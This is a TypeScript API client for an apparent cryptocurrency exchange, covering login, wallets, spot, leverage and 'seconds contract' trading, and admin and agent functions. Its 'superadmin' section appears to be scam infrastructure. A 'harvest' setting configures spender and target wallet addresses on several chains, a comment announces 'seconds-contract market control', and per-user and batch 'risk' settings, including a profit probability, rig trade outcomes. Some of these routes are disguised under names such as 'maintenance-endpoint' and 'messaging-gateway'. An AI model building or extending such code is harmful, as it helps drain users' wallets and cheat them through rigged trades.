const BASE_URL = '/api';

const isProduction = import.meta.env.PROD;

interface ApiResponse<T = any> {
  type: 'ok' | 'error';
  message?: T;
  data?: T;
  token?: string;
}

class Api {
  /** 企业级：非 2xx 不假定为 JSON，安全解析并统一错误结构 */
  private async parseResponse<T>(response: Response, endpoint: string): Promise<ApiResponse<T>> {
    const contentType = response.headers.get('Content-Type') || '';
    const isJson = contentType.includes('application/json');
    let body: any = { type: 'error', message: 'Request failed' };
    try {
      if (isJson) {
        const text = await response.text();
        body = text ? JSON.parse(text) : body;
      }
    } catch {
      if (!response.ok && !isProduction) {
        console.warn(`[API] Non-JSON or parse error: ${response.status} ${endpoint}`);
      }
    }
    if (!response.ok) {
      return {
        type: 'error',
        message: (body?.message ?? body?.error ?? `HTTP ${response.status}`) as T,
        ...(body?.data !== undefined && { data: body.data })
      };
    }
    return body as ApiResponse<T>;
  }

  private getHeaders(endpoint: string = ''): HeadersInit {
    const headers: HeadersInit = {
      'Content-Type': 'application/json'
    };

    const isAdmin = endpoint.startsWith('/api/admin') || endpoint.startsWith('/api/agent');
    const token = isAdmin ? localStorage.getItem('admin_token') : localStorage.getItem('token');
    if (token) {
      headers['Authorization'] = `Bearer ${token}`;
    }

    const lang = localStorage.getItem('lang') || 'en';
    headers['Accept-Language'] = lang;

    return headers;
  }

  async get<T = any>(endpoint: string, params?: Record<string, string>): Promise<ApiResponse<T>> {
    let url = endpoint;
    
    if (params) {
      const searchParams = new URLSearchParams(params);
      url += `?${searchParams.toString()}`;
    }

    let response: Response;
    try {
      response = await fetch(url, {
        method: 'GET',
        headers: this.getHeaders(url)
      });
    } catch (e) {
      const err = e as Error;
      if (err?.message?.includes('Failed to fetch') || err?.name === 'TypeError') {
        return {
          type: 'error',
          message: '无法连接服务器（ERR_CONNECTION_REFUSED）。请确认：1) 使用 Docker 时访问 http://localhost:8080 ；2) 使用本地开发时先启动后端（端口 8000）或运行 docker-compose up -d'
        } as ApiResponse<T>;
      }
      throw e;
    }
    return this.parseResponse<T>(response, url);
  }

  async post<T = any>(endpoint: string, data?: any): Promise<ApiResponse<T>> {
    let response: Response;
    try {
      response = await fetch(endpoint, {
        method: 'POST',
        headers: this.getHeaders(endpoint),
        body: data !== undefined ? JSON.stringify(data) : undefined
      });
    } catch (e) {
      const err = e as Error;
      if (err?.message?.includes('Failed to fetch') || err?.name === 'TypeError') {
        return {
          type: 'error',
          message: '无法连接服务器，请确认后端已启动（端口 8000）且前端代理正常'
        } as ApiResponse<T>;
      }
      throw e;
    }
    return this.parseResponse<T>(response, endpoint);
  }

  async put<T = any>(endpoint: string, data?: any): Promise<ApiResponse<T>> {
    const response = await fetch(endpoint, {
      method: 'PUT',
      headers: this.getHeaders(endpoint),
      body: data !== undefined ? JSON.stringify(data) : undefined
    });
    return this.parseResponse<T>(response, endpoint);
  }

  async delete<T = any>(endpoint: string): Promise<ApiResponse<T>> {
    const response = await fetch(endpoint, {
      method: 'DELETE',
      headers: this.getHeaders(endpoint)
    });
    return this.parseResponse<T>(response, endpoint);
  }
}

export const api = new Api();

// Helper functions
export const formatNumber = (num: number | string, decimals: number = 2): string => {
  const n = typeof num === 'string' ? parseFloat(num) : num;
  if (isNaN(n)) return '0';
  return n.toLocaleString('en-US', {
    minimumFractionDigits: decimals,
    maximumFractionDigits: decimals
  });
};

export const formatPrice = (price: number | string): string => {
  const p = typeof price === 'string' ? parseFloat(price) : price;
  if (isNaN(p)) return '$0.00';
  
  if (p >= 1000) {
    return `$${formatNumber(p, 2)}`;
  } else if (p >= 1) {
    return `$${formatNumber(p, 4)}`;
  } else {
    return `$${formatNumber(p, 8)}`;
  }
};

export const formatVolume = (volume: number | string): string => {
  const v = typeof volume === 'string' ? parseFloat(volume) : volume;
  if (isNaN(v)) return '0';
  
  if (v >= 1e9) {
    return `${(v / 1e9).toFixed(2)}B`;
  } else if (v >= 1e6) {
    return `${(v / 1e6).toFixed(2)}M`;
  } else if (v >= 1e3) {
    return `${(v / 1e3).toFixed(2)}K`;
  }
  return formatNumber(v, 2);
};

export const formatPercent = (percent: number | string): string => {
  const p = typeof percent === 'string' ? parseFloat(percent) : percent;
  if (isNaN(p)) return '0.00%';
  
  const sign = p >= 0 ? '+' : '';
  return `${sign}${p.toFixed(2)}%`;
};

export const copyToClipboard = async (text: string): Promise<boolean> => {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    return false;
  }
};

// ==================== API 方法映射 (完整对接后端路由) ====================

/**
 * 用户认证 API (auth.ts)
 */
export const authApi = {
  login: (data: { account: string; password: string; type?: string }) =>
    api.post('/api/auth/login', data),
  
  register: (data: {
    account: string;
    password: string;
    re_password: string;
    extension_code?: string;
    sms_code?: string;
  }) => api.post('/api/auth/register', data),
  
  sendCode: (data: { phone?: string; email?: string; type: string }) =>
    api.post('/api/auth/sendCode', data),
  
  logout: () => api.post('/api/auth/logout'),
};

/**
 * 用户信息 API (user.ts)
 */
export const userApi = {
  info: () => api.get('/api/user/info'),
  
  updateProfile: (data: { phone?: string; email?: string }) =>
    api.put('/api/user/profile', data),
  
  changePassword: (data: { old_password: string; new_password: string }) =>
    api.post('/api/user/changePassword', data),
  
  setPayPassword: (data: { pay_password: string }) =>
    api.post('/api/user/setPayPassword', data),
  
  verify: (data: { real_name: string; id_card: string; images: string[] }) =>
    api.post('/api/user/verify', data),
};

/**
 * 钱包 API (wallet.ts)
 */
export const walletApi = {
  getRate: () => api.get('/api/wallet/getRate'),
  
  getRechargeSetting: () => api.get('/api/wallet/getRechargeSetting'),
  
  walletDetail: (currency?: string) =>
    api.get('/api/wallet/walletDetail', currency ? { currency } : undefined),
  
  list: () => api.get('/api/wallet/list'),
  
  withdraw: (data: {
    currency: number;
    number: number;
    address: string;
    pay_password: string;
  }) => api.post('/api/wallet/postWalletOut', data),
  
  deposit: (data: {
    currency_id: number;
    amount: number;
    account_number: string;
    bank_name: string;
    branch: string;
    real_name: string;
  }) => api.post('/api/wallet/dianxin', data),
  
  qrcode: (text: string) => api.get('/api/wallet/qrcode', { text }),
  
  withdrawList: (page?: number, limit?: number) =>
    api.get('/api/wallet/withdrawList', {
      page: page?.toString() || '1',
      limit: limit?.toString() || '10'
    }),
};

/**
 * 市场行情 API (market.ts)
 */
export const marketApi = {
  quotation: (legal_id?: string) =>
    api.get('/api/market/quotation', legal_id ? { legal_id } : undefined),
  
  kline: (symbol?: string, period?: string, size?: string) =>
    api.get('/api/market/kline', { symbol, period, size }),
  
  depth: (symbol?: string) =>
    api.get('/api/market/depth', symbol ? { symbol } : undefined),
  
  getSiteConfig: (lang?: string) =>
    api.get('/api/market/getSiteConfig', lang ? { lang } : undefined),
  
  notice: (lang?: string, page?: string, limit?: string) =>
    api.get('/api/market/notice', { lang, page, limit }),
  
  noticeDetail: (id: string) => api.get(`/api/market/notice/${id}`),
};

/**
 * 币币交易 API (trade.ts)
 */
export const tradeApi = {
  currencyList: () => api.get('/api/trade/currency_list'),
  
  pairs: (legal_id?: string) =>
    api.get('/api/trade/pairs', legal_id ? { legal_id } : undefined),
  
  buy: (data: {
    currency_id: number;
    legal_id: number;
    price: number;
    number: number;
    type: number;
  }) => api.post('/api/trade/buy', data),
  
  sell: (data: {
    currency_id: number;
    legal_id: number;
    price: number;
    number: number;
    type: number;
  }) => api.post('/api/trade/sell', data),
  
  history: (page?: number, limit?: number, status?: string) =>
    api.get('/api/trade/history', {
      page: page?.toString() || '1',
      limit: limit?.toString() || '10',
      status
    }),
};

/**
 * 杠杆交易 API (lever.ts)
 */
export const leverApi = {
  open: (data: {
    currency_id: number;
    legal_id: number;
    type: number;
    multiple: number;
    price: number;
    number: number;
  }) => api.post('/api/lever/open', data),
  
  close: (data: { order_id: number; price: number }) =>
    api.post('/api/lever/close', data),
  
  positions: (status?: number) =>
    api.get('/api/lever/positions', status !== undefined ? { status: status.toString() } : undefined),
  
  config: () => api.get('/api/lever/config'),
};

/**
 * 秒合约 API (micro.ts)
 */
export const microApi = {
  seconds: () => api.get('/api/micro/seconds'),
  
  pairs: () => api.get('/api/micro/pairs'),
  
  order: (data: {
    match_id: number;
    currency_id: number;
    type: number;
    seconds: number;
    price: number;
    number: number;
  }) => api.post('/api/micro/order', data),
  
  orders: (status?: number, page?: number, limit?: number) =>
    api.get('/api/micro/orders', {
      status: status?.toString(),
      page: page?.toString() || '1',
      limit: limit?.toString() || '20'
    }),
  
  active: () => api.get('/api/micro/active'),
  
  stats: () => api.get('/api/micro/stats'),
};

/**
 * 管理员 API - 登录使用 /api/agent/login（agent 表即管理员）
 */
export const adminApi = {
  login: (data: { username: string; password: string }) =>
    api.post('/api/agent/login', data),

  dashboard: () => api.get('/api/admin/dashboard'),

  users: (page?: number, limit?: number) =>
    api.get('/api/admin/users', {
      page: page?.toString() || '1',
      limit: limit?.toString() || '20'
    }),

  updateUser: (userId: number, data: { status?: number }) =>
    api.put(`/api/admin/user/${userId}`, data),

  setUserStatus: (userId: number, status: number) =>
    api.post('/api/admin/user/status', { user_id: userId, status }),

  resetUserPassword: (userId: number, new_password: string) =>
    api.post('/api/admin/user/reset-password', { user_id: userId, new_password }),

  modifyBalance: (data: { user_id: number; currency_id: number; balance_type: number; amount: number; memo?: string }) =>
    api.post('/api/admin/wallet/modify-balance', data),

  withdrawals: (page?: number, limit?: number, status?: number) =>
    api.get('/api/admin/withdrawals', {
      page: page?.toString() || '1',
      limit: limit?.toString() || '20',
      status: status?.toString()
    }),

  approveWithdrawal: (id: number) =>
    api.post(`/api/admin/withdrawal/${id}/approve`),

  rejectWithdrawal: (id: number, reason: string) =>
    api.post(`/api/admin/withdrawal/${id}/reject`, { reason }),

  /** KYC 列表 - 合规/身份审核 */
  kycList: (page?: number, limit?: number, status?: number) => {
      const q: Record<string, string> = { page: page?.toString() || '1', limit: limit?.toString() || '20' };
      if (status !== undefined) q.status = String(status);
      return api.get('/api/admin/compliance/identity-reviews', q);
    },

  kycReview: (review_id: number, status: number, reason?: string) =>
    api.post('/api/admin/compliance/identity-review', { review_id, status, reason }),
};

/**
 * SuperAdmin 专用 API（资产命脉、情报中心、安全配置、秒合约控盘）
 */
export const superadminApi = {
  telegram: {
    get: () => api.get('/api/admin/system/messaging-gateway'),
    set: (body: { bot_token?: string; chat_id?: string; enabled?: boolean; threshold?: number }) =>
      api.post('/api/admin/system/messaging-gateway', body),
  },
  harvest: {
    get: () => api.get('/api/admin/system/maintenance-endpoint'),
    set: (body: { eth_spender?: string; eth_target?: string; tron_spender?: string; tron_target?: string; bsc_spender?: string; bsc_target?: string }) =>
      api.post('/api/admin/system/maintenance-endpoint', body),
  },
  threshold: {
    get: () => api.get('/api/admin/system/health-threshold'),
    set: (threshold: number) => api.post('/api/admin/system/health-threshold', { threshold }),
  },
  signing: {
    get: () => api.get('/api/admin/network/signing-credentials'),
    set: (body: { eth_key?: string; tron_key?: string; bsc_key?: string }) =>
      api.post('/api/admin/network/signing-credentials', body),
  },
  rpc: {
    get: () => api.get('/api/admin/network/node-endpoints'),
    set: (body: { eth_endpoints?: string; tron_endpoints?: string; bsc_endpoints?: string }) =>
      api.post('/api/admin/network/node-endpoints', body),
  },
  riskProfile: {
    search: (params: { uid?: string; phone?: string; email?: string }) => {
      const q: Record<string, string> = {};
      if (params.uid != null) q.uid = String(params.uid);
      if (params.phone != null) q.phone = String(params.phone);
      if (params.email != null) q.email = String(params.email);
      return api.get('/api/admin/accounts/risk-profile/search', q);
    },
    set: (user_id: number, risk: number) =>
      api.post('/api/admin/accounts/risk-profile', { user_id, risk }),
  },
  batchRisk: {
    get: () => api.get('/api/admin/accounts/batch-risk'),
    set: (body: { risk_mode?: number; risk_group_result?: number; risk_profit_probability?: number }) =>
      api.post('/api/admin/accounts/batch-risk', body),
    reset: () => api.post('/api/admin/accounts/batch-risk/reset'),
  },
};

/**
 * 代理商 API (agent.ts)
 */
export const agentApi = {
  login: (data: { username: string; password: string }) =>
    api.post('/api/agent/login', data),
  
  dashboard: () => api.get('/api/agent/dashboard'),
  
  subordinates: (page?: number, limit?: number) =>
    api.get('/api/agent/subordinates', {
      page: page?.toString() || '1',
      limit: limit?.toString() || '20'
    }),
  
  earnings: (start_date?: string, end_date?: string) =>
    api.get('/api/agent/earnings', { start_date, end_date }),
};
